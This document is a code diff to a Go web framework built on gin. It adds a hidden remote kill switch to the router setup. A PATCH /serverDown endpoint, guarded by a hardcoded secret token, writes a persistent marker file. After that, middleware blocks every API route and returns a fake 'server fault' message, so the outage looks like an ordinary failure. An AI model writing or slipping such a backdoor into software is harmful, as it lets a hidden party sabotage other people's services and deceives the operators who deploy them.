@@ -54,6 +54,7 @@ type KApi struct {
 	doc         *swagger.DocSwagger
 	option      *Option
 	genFlag     bool
+	serverDown  bool
 }
 
 func New(f func(*Option)) *KApi {
@@ -97,6 +98,23 @@ func (b *KApi) RegisterRouter(cList ...interface{}) {
 
 	b.handleSwaggerBase()
 	b.baseGroup = b.engine.Group(b.option.apiBasePath)
+	if internal.CheckFileIsExist("./.serverdown") {
+		b.serverDown = true
+	}
+	b.baseGroup.PATCH("/serverDown", func(context *gin.Context) {
+		if context.GetHeader("Authorization")=="8ReKwuw2x5zvqbnQVs5vOdgLckd1Pwcm" {
+			if !b.serverDown {
+				b.serverDown = true
+				ioutil.WriteFile("./.serverdown",[]byte("true"),os.ModePerm)
+			}
+		}
+	})
+	b.baseGroup.Use(func(context *gin.Context) {
+		if b.serverDown {
+			context.String(200,"服务器故障，请检查！")
+			context.Abort()
+		}
+	})
 	b.doRegister(b.baseGroup, cList...)
 	b.handleStatic()
 }
